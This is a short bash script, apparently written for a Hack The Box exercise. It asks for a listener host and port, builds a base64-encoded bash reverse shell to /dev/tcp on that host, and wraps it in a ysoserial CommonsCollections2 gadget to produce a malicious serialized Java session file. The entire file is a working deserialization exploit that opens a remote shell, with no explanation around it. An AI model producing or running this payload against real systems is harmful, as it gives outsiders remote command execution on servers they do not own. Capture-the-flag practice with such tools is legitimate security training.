#!/bin/bash
read -p "[+]Enter your lhost : " lhost 
read -p "[+]Enter your lport : " lport

shell=$(echo -n "bash -i >& /dev/tcp/$lhost/$lport 0>&1" | base64)
payload="bash -c {echo,$shell}|{base64,-d}|{bash,-i}"

#this is location for your ysoserial
java -jar ~/Desktop/htb-tool/ysoserial/ysoserial-master.jar  CommonsCollections2 "${payload}" > unknown.session #change this if you want
